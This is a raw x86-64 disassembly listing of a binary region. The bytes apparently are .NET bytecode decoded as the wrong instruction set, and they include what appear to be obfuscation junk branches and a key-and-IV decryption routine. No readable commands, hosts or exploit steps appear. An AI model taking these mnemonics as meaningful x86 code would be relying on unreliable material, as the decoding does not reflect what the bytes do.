  406d05:	30 04 00             	xor    %al,(%rax,%rax,1)
  406d08:	fd                   	std
  406d09:	00 00                	add    %al,(%rax)
  406d0b:	00 0a                	add    %cl,(%rdx)
  406d0d:	00 00                	add    %al,(%rax)
  406d0f:	11 2b                	adc    %ebp,(%rbx)
  406d11:	02 26                	add    (%rsi),%ah
  406d13:	16                   	(bad)
  406d14:	02 74 3a 00          	add    0x0(%rdx,%rdi,1),%dh
  406d18:	00 01                	add    %al,(%rcx)
  406d1a:	6f                   	outsl  (%rsi),(%dx)
  406d1b:	5b                   	pop    %rbx
  406d1c:	00 00                	add    %al,(%rax)
  406d1e:	0a 28                	or     (%rax),%ch
  406d20:	1c 00                	sbb    $0x0,%al
  406d22:	00 0a                	add    %cl,(%rdx)
  406d24:	39 11                	cmp    %edx,(%rcx)
  406d26:	00 00                	add    %al,(%rax)
  406d28:	00 02                	add    %al,(%rdx)
  406d2a:	74 3a                	je     0x406d66
  406d2c:	00 00                	add    %al,(%rax)
  406d2e:	01 6f 5b             	add    %ebp,0x5b(%rdi)
  406d31:	00 00                	add    %al,(%rax)
  406d33:	0a 0a                	or     (%rdx),%cl
  406d35:	dd d1                	fst    %st(1)
  406d37:	00 00                	add    %al,(%rax)
  406d39:	00 dd                	add    %bl,%ch
  406d3b:	06                   	(bad)
  406d3c:	00 00                	add    %al,(%rax)
  406d3e:	00 26                	add    %ah,(%rsi)
  406d40:	dd 00                	fldl   (%rax)
  406d42:	00 00                	add    %al,(%rax)
  406d44:	00 02                	add    %al,(%rdx)
  406d46:	74 3a                	je     0x406d82
  406d48:	00 00                	add    %al,(%rax)
  406d4a:	01 6f 5c             	add    %ebp,0x5c(%rdi)
  406d4d:	00 00                	add    %al,(%rax)
  406d4f:	0a 6f 5d             	or     0x5d(%rdi),%ch
  406d52:	00 00                	add    %al,(%rax)
  406d54:	0a 6f 18             	or     0x18(%rdi),%ch
  406d57:	00 00                	add    %al,(%rax)
  406d59:	0a 72 fe             	or     -0x2(%rdx),%dh
  406d5c:	01 00                	add    %eax,(%rax)
  406d5e:	70 72                	jo     0x406dd2
  406d60:	01 00                	add    %eax,(%rax)
  406d62:	00 70 6f             	add    %dh,0x6f(%rax)
  406d65:	5e                   	pop    %rsi
  406d66:	00 00                	add    %al,(%rax)
  406d68:	0a 28                	or     (%rax),%ch
  406d6a:	1c 00                	sbb    $0x0,%al
  406d6c:	00 0a                	add    %cl,(%rdx)
  406d6e:	39 2a                	cmp    %ebp,(%rdx)
  406d70:	00 00                	add    %al,(%rax)
  406d72:	00 02                	add    %al,(%rdx)
  406d74:	74 3a                	je     0x406db0
  406d76:	00 00                	add    %al,(%rax)
  406d78:	01 6f 5c             	add    %ebp,0x5c(%rdi)
  406d7b:	00 00                	add    %al,(%rax)
  406d7d:	0a 6f 5d             	or     0x5d(%rdi),%ch
  406d80:	00 00                	add    %al,(%rax)
  406d82:	0a 6f 18             	or     0x18(%rdi),%ch
  406d85:	00 00                	add    %al,(%rax)
  406d87:	0a 72 fe             	or     -0x2(%rdx),%dh
  406d8a:	01 00                	add    %eax,(%rax)
  406d8c:	70 72                	jo     0x406e00
  406d8e:	01 00                	add    %eax,(%rax)
  406d90:	00 70 6f             	add    %dh,0x6f(%rax)
  406d93:	5e                   	pop    %rsi
  406d94:	00 00                	add    %al,(%rax)
  406d96:	0a 0a                	or     (%rdx),%cl
  406d98:	dd 6e 00             	(bad) 0x0(%rsi)
  406d9b:	00 00                	add    %al,(%rax)
  406d9d:	dd 06                	fldl   (%rsi)
  406d9f:	00 00                	add    %al,(%rax)
  406da1:	00 26                	add    %ah,(%rsi)
  406da3:	dd 00                	fldl   (%rax)
  406da5:	00 00                	add    %al,(%rax)
  406da7:	00 02                	add    %al,(%rdx)
  406da9:	6f                   	outsl  (%rsi),(%dx)
  406daa:	5f                   	pop    %rdi
  406dab:	00 00                	add    %al,(%rax)
  406dad:	0a 72 10             	or     0x10(%rdx),%dh
  406db0:	02 00                	add    (%rax),%al
  406db2:	70 6f                	jo     0x406e23
  406db4:	60                   	(bad)
  406db5:	00 00                	add    %al,(%rax)
  406db7:	0a 02                	or     (%rdx),%al
  406db9:	16                   	(bad)
  406dba:	8d 0c 00             	lea    (%rax,%rax,1),%ecx
  406dbd:	00 01                	add    %al,(%rcx)
  406dbf:	6f                   	outsl  (%rsi),(%dx)
  406dc0:	61                   	(bad)
  406dc1:	00 00                	add    %al,(%rax)
  406dc3:	0a 6f 18             	or     0x18(%rdi),%ch
  406dc6:	00 00                	add    %al,(%rax)
  406dc8:	0a 28                	or     (%rax),%ch
  406dca:	1c 00                	sbb    $0x0,%al
  406dcc:	00 0a                	add    %cl,(%rdx)
  406dce:	39 27                	cmp    %esp,(%rdi)
  406dd0:	00 00                	add    %al,(%rax)
  406dd2:	00 02                	add    %al,(%rdx)
  406dd4:	6f                   	outsl  (%rsi),(%dx)
  406dd5:	5f                   	pop    %rdi
  406dd6:	00 00                	add    %al,(%rax)
  406dd8:	0a 72 10             	or     0x10(%rdx),%dh
  406ddb:	02 00                	add    (%rax),%al
  406ddd:	70 6f                	jo     0x406e4e
  406ddf:	60                   	(bad)
  406de0:	00 00                	add    %al,(%rax)
  406de2:	0a 02                	or     (%rdx),%al
  406de4:	16                   	(bad)
  406de5:	8d 0c 00             	lea    (%rax,%rax,1),%ecx
  406de8:	00 01                	add    %al,(%rcx)
  406dea:	6f                   	outsl  (%rsi),(%dx)
  406deb:	61                   	(bad)
  406dec:	00 00                	add    %al,(%rax)
  406dee:	0a 6f 18             	or     0x18(%rdi),%ch
  406df1:	00 00                	add    %al,(%rax)
  406df3:	0a 0a                	or     (%rdx),%cl
  406df5:	dd 11                	fstl   (%rcx)
  406df7:	00 00                	add    %al,(%rax)
  406df9:	00 dd                	add    %bl,%ch
  406dfb:	06                   	(bad)
  406dfc:	00 00                	add    %al,(%rax)
  406dfe:	00 26                	add    %ah,(%rsi)
  406e00:	dd 00                	fldl   (%rax)
  406e02:	00 00                	add    %al,(%rax)
  406e04:	00 72 01             	add    %dh,0x1(%rdx)
  406e07:	00 00                	add    %al,(%rax)
  406e09:	70 2a                	jo     0x406e35
  406e0b:	06                   	(bad)
  406e0c:	2a 00                	sub    (%rax),%al
  406e0e:	00 00                	add    %al,(%rax)
  406e10:	01 28                	add    %ebp,(%rax)
  406e12:	00 00                	add    %al,(%rax)
  406e14:	00 00                	add    %al,(%rax)
  406e16:	04 00                	add    $0x0,%al
  406e18:	2b 2f                	sub    (%rdi),%ebp
  406e1a:	00 06                	add    %al,(%rsi)
  406e1c:	0c 00                	or     $0x0,%al
  406e1e:	00 01                	add    %al,(%rcx)
  406e20:	00 00                	add    %al,(%rax)
  406e22:	35 00 5d 92 00       	xor    $0x925d00,%eax
  406e27:	06                   	(bad)
  406e28:	0c 00                	or     $0x0,%al
  406e2a:	00 01                	add    %al,(%rcx)
  406e2c:	00 00                	add    %al,(%rax)
  406e2e:	98                   	cwtl
  406e2f:	00 57 ef             	add    %dl,-0x11(%rdi)
  406e32:	00 06                	add    %al,(%rsi)
  406e34:	0c 00                	or     $0x0,%al
  406e36:	00 01                	add    %al,(%rcx)
  406e38:	1b 30                	sbb    (%rax),%esi
  406e3a:	05 00 5c 00 00       	add    $0x5c00,%eax
  406e3f:	00 0b                	add    %cl,(%rbx)
  406e41:	00 00                	add    %al,(%rax)
  406e43:	11 2b                	adc    %ebp,(%rbx)
  406e45:	02 26                	add    (%rsi),%ah
  406e47:	16                   	(bad)
  406e48:	02 19                	add    (%rcx),%bl
  406e4a:	17                   	(bad)
  406e4b:	17                   	(bad)
  406e4c:	73 62                	jae    0x406eb0
  406e4e:	00 00                	add    %al,(%rax)
  406e50:	0a 0b                	or     (%rbx),%cl
  406e52:	16                   	(bad)
  406e53:	0c 07                	or     $0x7,%al
  406e55:	6f                   	outsl  (%rsi),(%dx)
  406e56:	63 00                	movsxd (%rax),%eax
  406e58:	00 0a                	add    %cl,(%rdx)
  406e5a:	0d 09 69 13 04       	or     $0x4136909,%eax
  406e5f:	11 04 8d 11 00 00 01 	adc    %eax,0x1000011(,%rcx,4)
  406e66:	0a 38                	or     (%rax),%bh
  406e68:	18 00                	sbb    %al,(%rax)
  406e6a:	00 00                	add    %al,(%rax)
  406e6c:	07                   	(bad)
  406e6d:	06                   	(bad)
  406e6e:	08 11                	or     %dl,(%rcx)
  406e70:	04 6f                	add    $0x6f,%al
  406e72:	64 00 00             	add    %al,%fs:(%rax)
  406e75:	0a 13                	or     (%rbx),%dl
  406e77:	05 08 11 05 58       	add    $0x58051108,%eax
  406e7c:	0c 11                	or     $0x11,%al
  406e7e:	04 11                	add    $0x11,%al
  406e80:	05 59 13 04 11       	add    $0x11041359,%eax
  406e85:	04 16                	add    $0x16,%al
  406e87:	3d e0 ff ff ff       	cmp    $0xffffffe0,%eax
  406e8c:	dd 0d 00 00 00 07    	fisttpll 0x7000000(%rip)        # 0x7406e92
  406e92:	39 06                	cmp    %eax,(%rsi)
  406e94:	00 00                	add    %al,(%rax)
  406e96:	00 07                	add    %al,(%rdi)
  406e98:	6f                   	outsl  (%rsi),(%dx)
  406e99:	16                   	(bad)
  406e9a:	00 00                	add    %al,(%rax)
  406e9c:	0a dc                	or     %ah,%bl
  406e9e:	06                   	(bad)
  406e9f:	2a 01                	sub    (%rcx),%al
  406ea1:	10 00                	adc    %al,(%rax)
  406ea3:	00 02                	add    %al,(%rdx)
  406ea5:	00 0e                	add    %cl,(%rsi)
  406ea7:	00 3f                	add    %bh,(%rdi)
  406ea9:	4d 00 0d 00 00 00 00 	rex.WRB add %r9b,0x0(%rip)        # 0x406eb0
  406eb0:	13 30                	adc    (%rax),%esi
  406eb2:	05 00 68 00 00       	add    $0x6800,%eax
  406eb7:	00 0c 00             	add    %cl,(%rax,%rax,1)
  406eba:	00 11                	add    %dl,(%rcx)
  406ebc:	2b 02                	sub    (%rdx),%eax
  406ebe:	26 16                	es (bad)
  406ec0:	73 31                	jae    0x406ef3
  406ec2:	00 00                	add    %al,(%rax)
  406ec4:	0a 0a                	or     (%rdx),%cl
  406ec6:	28 18                	sub    %bl,(%rax)
  406ec8:	00 00                	add    %al,(%rax)
  406eca:	06                   	(bad)
  406ecb:	0b 07                	or     (%rdi),%eax
  406ecd:	1f                   	(bad)
  406ece:	20 8d 11 00 00 01    	and    %cl,0x1000011(%rbp)
  406ed4:	25 d0 28 00 00       	and    $0x28d0,%eax
  406ed9:	04 28                	add    $0x28,%al
  406edb:	47 00 00             	rex.RXB add %r8b,(%r8)
  406ede:	0a 6f 65             	or     0x65(%rdi),%ch
  406ee1:	00 00                	add    %al,(%rax)
  406ee3:	0a 07                	or     (%rdi),%al
  406ee5:	1f                   	(bad)
  406ee6:	10 8d 11 00 00 01    	adc    %cl,0x1000011(%rbp)
  406eec:	25 d0 29 00 00       	and    $0x29d0,%eax
  406ef1:	04 28                	add    $0x28,%al
  406ef3:	47 00 00             	rex.RXB add %r8b,(%r8)
  406ef6:	0a 6f 66             	or     0x66(%rdi),%ch
  406ef9:	00 00                	add    %al,(%rax)
  406efb:	0a 06                	or     (%rsi),%al
  406efd:	07                   	(bad)
  406efe:	6f                   	outsl  (%rsi),(%dx)
  406eff:	67 00 00             	add    %al,(%eax)
  406f02:	0a 17                	or     (%rdi),%dl
  406f04:	73 32                	jae    0x406f38
  406f06:	00 00                	add    %al,(%rax)
  406f08:	0a 0c 08             	or     (%rax,%rcx,1),%cl
  406f0b:	02 16                	add    (%rsi),%dl
  406f0d:	02 8e 69 6f 33 00    	add    0x336f69(%rsi),%cl
  406f13:	00 0a                	add    %cl,(%rdx)
  406f15:	08 6f 34             	or     %ch,0x34(%rdi)
  406f18:	00 00                	add    %al,(%rax)
  406f1a:	0a 06                	or     (%rsi),%al
  406f1c:	6f                   	outsl  (%rsi),(%dx)
  406f1d:	35 00 00 0a 0d       	xor    $0xd0a0000,%eax
  406f22:	09 2a                	or     %ebp,(%rdx)
  406f24:	13 30                	adc    (%rax),%esi
  406f26:	02 00                	add    (%rax),%al
  406f28:	06                   	(bad)
  406f29:	00 00                	add    %al,(%rax)
  406f2b:	00 0d 00 00 11 2b    	add    %cl,0x2b110000(%rip)        # 0x2b516f31
  406f31:	02 26                	add    (%rsi),%ah
  406f33:	16                   	(bad)
  406f34:	14 2a                	adc    $0x2a,%al
  406f36:	00 00                	add    %al,(%rax)
  406f38:	13 30                	adc    (%rax),%esi
  406f3a:	02 00                	add    (%rax),%al
  406f3c:	06                   	(bad)
  406f3d:	00 00                	add    %al,(%rax)
  406f3f:	00 0d 00 00 11 2b    	add    %cl,0x2b110000(%rip)        # 0x2b516f45
  406f45:	02 26                	add    (%rsi),%ah
  406f47:	16                   	(bad)
  406f48:	14 2a                	adc    $0x2a,%al
  406f4a:	00 00                	add    %al,(%rax)
  406f4c:	13 30                	adc    (%rax),%esi
  406f4e:	04 00                	add    $0x0,%al
  406f50:	38 00                	cmp    %al,(%rax)
  406f52:	00 00                	add    %al,(%rax)
  406f54:	0e                   	(bad)
  406f55:	00 00                	add    %al,(%rax)
  406f57:	11 2b                	adc    %ebp,(%rbx)
  406f59:	02 26                	add    (%rsi),%ah
  406f5b:	16                   	(bad)
  406f5c:	72 22                	jb     0x406f80
  406f5e:	02 00                	add    (%rax),%al
  406f60:	70 0a                	jo     0x406f6c
  406f62:	06                   	(bad)
  406f63:	6f                   	outsl  (%rsi),(%dx)
  406f64:	54                   	push   %rsp
  406f65:	00 00                	add    %al,(%rax)
  406f67:	0a 16                	or     (%rsi),%dl
  406f69:	3e 11 00             	ds adc %eax,(%rax)
  406f6c:	00 00                	add    %al,(%rax)
  406f6e:	18 8d 11 00 00 01    	sbb    %cl,0x1000011(%rbp)
  406f74:	0b 07                	or     (%rdi),%eax
  406f76:	16                   	(bad)
  406f77:	17                   	(bad)
  406f78:	9c                   	pushf
  406f79:	07                   	(bad)
  406f7a:	17                   	(bad)
  406f7b:	18 9c 07 2a 18 8d 11 	sbb    %bl,0x118d182a(%rdi,%rax,1)
  406f82:	00 00                	add    %al,(%rax)
  406f84:	01 0c 08             	add    %ecx,(%rax,%rcx,1)
  406f87:	16                   	(bad)
  406f88:	17                   	(bad)
  406f89:	9c                   	pushf
  406f8a:	08 17                	or     %dl,(%rdi)
  406f8c:	18 9c 08 2a 13 30 04 	sbb    %bl,0x430132a(%rax,%rcx,1)
  406f93:	00 38                	add    %bh,(%rax)
  406f95:	00 00                	add    %al,(%rax)
  406f97:	00 0e                	add    %cl,(%rsi)
  406f99:	00 00                	add    %al,(%rax)
  406f9b:	11 2b                	adc    %ebp,(%rbx)
  406f9d:	02 26                	add    (%rsi),%ah
  406f9f:	16                   	(bad)
  406fa0:	72 56                	jb     0x406ff8
  406fa2:	02 00                	add    (%rax),%al
  406fa4:	70 0a                	jo     0x406fb0
  406fa6:	06                   	(bad)
  406fa7:	6f                   	outsl  (%rsi),(%dx)
  406fa8:	54                   	push   %rsp
  406fa9:	00 00                	add    %al,(%rax)
  406fab:	0a 16                	or     (%rsi),%dl
  406fad:	3e 11 00             	ds adc %eax,(%rax)
  406fb0:	00 00                	add    %al,(%rax)
  406fb2:	18 8d 11 00 00 01    	sbb    %cl,0x1000011(%rbp)
  406fb8:	0b 07                	or     (%rdi),%eax
  406fba:	16                   	(bad)
  406fbb:	17                   	(bad)
  406fbc:	9c                   	pushf
  406fbd:	07                   	(bad)
  406fbe:	17                   	(bad)
  406fbf:	18 9c 07 2a 18 8d 11 	sbb    %bl,0x118d182a(%rdi,%rax,1)
  406fc6:	00 00                	add    %al,(%rax)
  406fc8:	01 0c 08             	add    %ecx,(%rax,%rcx,1)
  406fcb:	16                   	(bad)
  406fcc:	17                   	(bad)
  406fcd:	9c                   	pushf
  406fce:	08 17                	or     %dl,(%rdi)
  406fd0:	18 9c 08 2a 13 30 04 	sbb    %bl,0x430132a(%rax,%rcx,1)
  406fd7:	00 38                	add    %bh,(%rax)
  406fd9:	00 00                	add    %al,(%rax)
  406fdb:	00 0e                	add    %cl,(%rsi)
  406fdd:	00 00                	add    %al,(%rax)
  406fdf:	11 2b                	adc    %ebp,(%rbx)
  406fe1:	02 26                	add    (%rsi),%ah
  406fe3:	16                   	(bad)
  406fe4:	72 8a                	jb     0x406f70
  406fe6:	02 00                	add    (%rax),%al
  406fe8:	70 0a                	jo     0x406ff4
  406fea:	06                   	(bad)
  406feb:	6f                   	outsl  (%rsi),(%dx)
  406fec:	54                   	push   %rsp
  406fed:	00 00                	add    %al,(%rax)
  406fef:	0a 16                	or     (%rsi),%dl
  406ff1:	3e 11 00             	ds adc %eax,(%rax)
  406ff4:	00 00                	add    %al,(%rax)
  406ff6:	18 8d 11 00 00 01    	sbb    %cl,0x1000011(%rbp)
  406ffc:	0b 07                	or     (%rdi),%eax
  406ffe:	16                   	(bad)
  406fff:	17                   	(bad)
  407000:	9c                   	pushf
  407001:	07                   	(bad)
  407002:	17                   	(bad)
  407003:	18 9c 07 2a 18 8d 11 	sbb    %bl,0x118d182a(%rdi,%rax,1)
  40700a:	00 00                	add    %al,(%rax)
  40700c:	01 0c 08             	add    %ecx,(%rax,%rcx,1)
  40700f:	16                   	(bad)
  407010:	17                   	(bad)
  407011:	9c                   	pushf
  407012:	08 17                	or     %dl,(%rdi)
  407014:	18 9c 08 2a 13 30 04 	sbb    %bl,0x430132a(%rax,%rcx,1)
  40701b:	00 38                	add    %bh,(%rax)
  40701d:	00 00                	add    %al,(%rax)
  40701f:	00 0e                	add    %cl,(%rsi)
  407021:	00 00                	add    %al,(%rax)
  407023:	11 2b                	adc    %ebp,(%rbx)
  407025:	02 26                	add    (%rsi),%ah
  407027:	16                   	(bad)
  407028:	72 be                	jb     0x406fe8
  40702a:	02 00                	add    (%rax),%al
  40702c:	70 0a                	jo     0x407038
  40702e:	06                   	(bad)
  40702f:	6f                   	outsl  (%rsi),(%dx)
  407030:	54                   	push   %rsp
  407031:	00 00                	add    %al,(%rax)
  407033:	0a 16                	or     (%rsi),%dl
  407035:	3e 11 00             	ds adc %eax,(%rax)
  407038:	00 00                	add    %al,(%rax)
  40703a:	18 8d 11 00 00 01    	sbb    %cl,0x1000011(%rbp)
  407040:	0b 07                	or     (%rdi),%eax
  407042:	16                   	(bad)
  407043:	17                   	(bad)
  407044:	9c                   	pushf
  407045:	07                   	(bad)
  407046:	17                   	(bad)
  407047:	18 9c 07 2a 18 8d 11 	sbb    %bl,0x118d182a(%rdi,%rax,1)
  40704e:	00 00                	add    %al,(%rax)
  407050:	01 0c 08             	add    %ecx,(%rax,%rcx,1)
  407053:	16                   	(bad)
  407054:	17                   	(bad)
  407055:	9c                   	pushf
  407056:	08 17                	or     %dl,(%rdi)
  407058:	18 9c 08 2a 13 30 04 	sbb    %bl,0x430132a(%rax,%rcx,1)
  40705f:	00 38                	add    %bh,(%rax)
  407061:	00 00                	add    %al,(%rax)
  407063:	00 0e                	add    %cl,(%rsi)
  407065:	00 00                	add    %al,(%rax)
  407067:	11 2b                	adc    %ebp,(%rbx)
  407069:	02 26                	add    (%rsi),%ah
  40706b:	16                   	(bad)
  40706c:	72 f2                	jb     0x407060
  40706e:	02 00                	add    (%rax),%al
  407070:	70 0a                	jo     0x40707c
  407072:	06                   	(bad)
  407073:	6f                   	outsl  (%rsi),(%dx)
  407074:	54                   	push   %rsp
  407075:	00 00                	add    %al,(%rax)
  407077:	0a 16                	or     (%rsi),%dl
  407079:	3e 11 00             	ds adc %eax,(%rax)
  40707c:	00 00                	add    %al,(%rax)
  40707e:	18 8d 11 00 00 01    	sbb    %cl,0x1000011(%rbp)
  407084:	0b 07                	or     (%rdi),%eax
  407086:	16                   	(bad)
  407087:	17                   	(bad)
  407088:	9c                   	pushf
  407089:	07                   	(bad)
  40708a:	17                   	(bad)
  40708b:	18 9c 07 2a 18 8d 11 	sbb    %bl,0x118d182a(%rdi,%rax,1)
  407092:	00 00                	add    %al,(%rax)
  407094:	01 0c 08             	add    %ecx,(%rax,%rcx,1)
  407097:	16                   	(bad)
  407098:	17                   	(bad)
  407099:	9c                   	pushf
  40709a:	08 17                	or     %dl,(%rdi)
  40709c:	18 9c 08 2a 13 30 04 	sbb    %bl,0x430132a(%rax,%rcx,1)
  4070a3:	00 38                	add    %bh,(%rax)
  4070a5:	00 00                	add    %al,(%rax)
  4070a7:	00 0e                	add    %cl,(%rsi)
  4070a9:	00 00                	add    %al,(%rax)
  4070ab:	11 2b                	adc    %ebp,(%rbx)
  4070ad:	02 26                	add    (%rsi),%ah
  4070af:	16                   	(bad)
  4070b0:	72 26                	jb     0x4070d8
  4070b2:	03 00                	add    (%rax),%eax
  4070b4:	70 0a                	jo     0x4070c0
  4070b6:	06                   	(bad)
  4070b7:	6f                   	outsl  (%rsi),(%dx)
  4070b8:	54                   	push   %rsp
  4070b9:	00 00                	add    %al,(%rax)
  4070bb:	0a 16                	or     (%rsi),%dl
  4070bd:	3e 11 00             	ds adc %eax,(%rax)
  4070c0:	00 00                	add    %al,(%rax)
  4070c2:	18 8d 11 00 00 01    	sbb    %cl,0x1000011(%rbp)
  4070c8:	0b 07                	or     (%rdi),%eax
  4070ca:	16                   	(bad)
  4070cb:	17                   	(bad)
  4070cc:	9c                   	pushf
  4070cd:	07                   	(bad)
  4070ce:	17                   	(bad)
  4070cf:	18 9c 07 2a 18 8d 11 	sbb    %bl,0x118d182a(%rdi,%rax,1)
  4070d6:	00 00                	add    %al,(%rax)
  4070d8:	01 0c 08             	add    %ecx,(%rax,%rcx,1)
  4070db:	16                   	(bad)
  4070dc:	17                   	(bad)
  4070dd:	9c                   	pushf
  4070de:	08 17                	or     %dl,(%rdi)
  4070e0:	18 9c 08 2a 13 30 04 	sbb    %bl,0x430132a(%rax,%rcx,1)
  4070e7:	00 38                	add    %bh,(%rax)
  4070e9:	00 00                	add    %al,(%rax)
  4070eb:	00 0e                	add    %cl,(%rsi)
  4070ed:	00 00                	add    %al,(%rax)
  4070ef:	11 2b                	adc    %ebp,(%rbx)
  4070f1:	02 26                	add    (%rsi),%ah
  4070f3:	16                   	(bad)
  4070f4:	72 5a                	jb     0x407150
  4070f6:	03 00                	add    (%rax),%eax
  4070f8:	70 0a                	jo     0x407104
  4070fa:	06                   	(bad)
  4070fb:	6f                   	outsl  (%rsi),(%dx)
  4070fc:	54                   	push   %rsp
  4070fd:	00 00                	add    %al,(%rax)
  4070ff:	0a 16                	or     (%rsi),%dl
  407101:	3e 11 00             	ds adc %eax,(%rax)
  407104:	00 00                	add    %al,(%rax)
  407106:	18 8d 11 00 00 01    	sbb    %cl,0x1000011(%rbp)
  40710c:	0b 07                	or     (%rdi),%eax
  40710e:	16                   	(bad)
  40710f:	17                   	(bad)
  407110:	9c                   	pushf
  407111:	07                   	(bad)
  407112:	17                   	(bad)
  407113:	18 9c 07 2a 18 8d 11 	sbb    %bl,0x118d182a(%rdi,%rax,1)
  40711a:	00 00                	add    %al,(%rax)
  40711c:	01 0c 08             	add    %ecx,(%rax,%rcx,1)
  40711f:	16                   	(bad)
  407120:	17                   	(bad)
  407121:	9c                   	pushf
  407122:	08 17                	or     %dl,(%rdi)
  407124:	18 9c 08 2a 13 30 04 	sbb    %bl,0x430132a(%rax,%rcx,1)
  40712b:	00 38                	add    %bh,(%rax)
  40712d:	00 00                	add    %al,(%rax)
  40712f:	00 0e                	add    %cl,(%rsi)
  407131:	00 00                	add    %al,(%rax)
  407133:	11 2b                	adc    %ebp,(%rbx)
  407135:	02 26                	add    (%rsi),%ah
  407137:	16                   	(bad)
  407138:	72 8e                	jb     0x4070c8
  40713a:	03 00                	add    (%rax),%eax
  40713c:	70 0a                	jo     0x407148
  40713e:	06                   	(bad)
  40713f:	6f                   	outsl  (%rsi),(%dx)
  407140:	54                   	push   %rsp
  407141:	00 00                	add    %al,(%rax)
  407143:	0a 16                	or     (%rsi),%dl
  407145:	3e 11 00             	ds adc %eax,(%rax)
  407148:	00 00                	add    %al,(%rax)
  40714a:	18 8d 11 00 00 01    	sbb    %cl,0x1000011(%rbp)
  407150:	0b 07                	or     (%rdi),%eax
  407152:	16                   	(bad)
  407153:	17                   	(bad)
  407154:	9c                   	pushf
  407155:	07                   	(bad)
  407156:	17                   	(bad)
  407157:	18 9c 07 2a 18 8d 11 	sbb    %bl,0x118d182a(%rdi,%rax,1)
  40715e:	00 00                	add    %al,(%rax)
  407160:	01 0c 08             	add    %ecx,(%rax,%rcx,1)
  407163:	16                   	(bad)
  407164:	17                   	(bad)
  407165:	9c                   	pushf
  407166:	08 17                	or     %dl,(%rdi)
  407168:	18 9c 08 2a 3e 2b 02 	sbb    %bl,0x22b3e2a(%rax,%rcx,1)
  40716f:	26 16                	es (bad)
  407171:	2b 02                	sub    (%rdx),%eax
  407173:	26 16                	es (bad)
  407175:	02 28                	add    (%rax),%ch
  407177:	3b 00                	cmp    (%rax),%eax
  407179:	00 0a                	add    %cl,(%rdx)
  40717b:	2a 4a 2b             	sub    0x2b(%rdx),%cl
  40717e:	02 26                	add    (%rsi),%ah
  407180:	16                   	(bad)
  407181:	fe 09                	decb   (%rcx)
  407183:	00 00                	add    %al,(%rax)
  407185:	fe 09                	decb   (%rcx)
  407187:	01 00                	add    %eax,(%rax)
  407189:	6f                   	outsl  (%rsi),(%dx)
  40718a:	68 00 00 0a 2a       	push   $0x2a0a0000
  40718f:	00 3a                	add    %bh,(%rdx)
  407191:	2b 02                	sub    (%rdx),%eax
  407193:	26 16                	es (bad)
  407195:	fe 09                	decb   (%rcx)
  407197:	00 00                	add    %al,(%rax)
  407199:	6f                   	outsl  (%rsi),(%dx)
  40719a:	69 00 00 0a 2a 00    	imul   $0x2a0a00,(%rax),%eax
  4071a0:	4a 2b 02             	rex.WX sub (%rdx),%rax
  4071a3:	26 16                	es (bad)
  4071a5:	fe 09                	decb   (%rcx)
  4071a7:	00 00                	add    %al,(%rax)
  4071a9:	fe 09                	decb   (%rcx)
  4071ab:	01 00                	add    %eax,(%rax)
  4071ad:	6f                   	outsl  (%rsi),(%dx)
  4071ae:	6a 00                	push   $0x0
  4071b0:	00 0a                	add    %cl,(%rdx)
  4071b2:	2a 00                	sub    (%rax),%al
  4071b4:	3a 2b                	cmp    (%rbx),%ch
  4071b6:	02 26                	add    (%rsi),%ah
  4071b8:	16                   	(bad)
  4071b9:	fe 09                	decb   (%rcx)
  4071bb:	00 00                	add    %al,(%rax)
  4071bd:	6f                   	outsl  (%rsi),(%dx)
  4071be:	63 00                	movsxd (%rax),%eax
  4071c0:	00 0a                	add    %cl,(%rdx)
  4071c2:	2a 00                	sub    (%rax),%al
  4071c4:	4a 2b 02             	rex.WX sub (%rdx),%rax
  4071c7:	26 16                	es (bad)
  4071c9:	fe 09                	decb   (%rcx)
  4071cb:	00 00                	add    %al,(%rax)
  4071cd:	fe 09                	decb   (%rcx)
  4071cf:	01 00                	add    %eax,(%rax)
  4071d1:	6f                   	outsl  (%rsi),(%dx)
  4071d2:	6b 00 00             	imul   $0x0,(%rax),%eax
  4071d5:	0a 2a                	or     (%rdx),%ch
  4071d7:	00 3a                	add    %bh,(%rdx)
  4071d9:	2b 02                	sub    (%rdx),%eax
  4071db:	26 16                	es (bad)
  4071dd:	fe 09                	decb   (%rcx)
  4071df:	00 00                	add    %al,(%rax)
  4071e1:	6f                   	outsl  (%rsi),(%dx)
  4071e2:	6c                   	insb   (%dx),(%rdi)
  4071e3:	00 00                	add    %al,(%rax)
  4071e5:	0a 2a                	or     (%rdx),%ch
  4071e7:	00 3e                	add    %bh,(%rsi)
  4071e9:	2b 02                	sub    (%rdx),%eax
  4071eb:	26 16                	es (bad)
  4071ed:	00 fe                	add    %bh,%dh
  4071ef:	09 00                	or     %eax,(%rax)
  4071f1:	00 28                	add    %ch,(%rax)
  4071f3:	6d                   	insl   (%dx),(%rdi)
  4071f4:	00 00                	add    %al,(%rax)
  4071f6:	0a 2a                	or     (%rdx),%ch
  4071f8:	3a 2b                	cmp    (%rbx),%ch
  4071fa:	02 26                	add    (%rsi),%ah
  4071fc:	16                   	(bad)
  4071fd:	fe 09                	decb   (%rcx)
  4071ff:	00 00                	add    %al,(%rax)
  407201:	6f                   	outsl  (%rsi),(%dx)
  407202:	5c                   	pop    %rsp
  407203:	00 00                	add    %al,(%rax)
  407205:	0a 2a                	or     (%rdx),%ch
  407207:	00 3a                	add    %bh,(%rdx)
  407209:	2b 02                	sub    (%rdx),%eax
  40720b:	26 16                	es (bad)
  40720d:	fe 09                	decb   (%rcx)
  40720f:	00 00                	add    %al,(%rax)
  407211:	6f                   	outsl  (%rsi),(%dx)
  407212:	6e                   	outsb  (%rsi),(%dx)
  407213:	00 00                	add    %al,(%rax)
  407215:	0a 2a                	or     (%rdx),%ch
  407217:	00 2e                	add    %ch,(%rsi)
  407219:	2b 02                	sub    (%rdx),%eax
  40721b:	26 16                	es (bad)
  40721d:	00 28                	add    %ch,(%rax)
  40721f:	18 00                	sbb    %al,(%rax)
  407221:	00 06                	add    %al,(%rsi)
  407223:	2a 4a 2b             	sub    0x2b(%rdx),%cl
  407226:	02 26                	add    (%rsi),%ah
  407228:	16                   	(bad)
  407229:	fe 09                	decb   (%rcx)
  40722b:	00 00                	add    %al,(%rax)
  40722d:	fe 09                	decb   (%rcx)
  40722f:	01 00                	add    %eax,(%rax)
  407231:	6f                   	outsl  (%rsi),(%dx)
  407232:	2d 00 00 0a 2a       	sub    $0x2a0a0000,%eax
  407237:	00 5a 2b             	add    %bl,0x2b(%rdx)
  40723a:	02 26                	add    (%rsi),%ah
  40723c:	16                   	(bad)
  40723d:	fe 09                	decb   (%rcx)
  40723f:	00 00                	add    %al,(%rax)
  407241:	fe 09                	decb   (%rcx)
  407243:	01 00                	add    %eax,(%rax)
  407245:	fe 09                	decb   (%rcx)
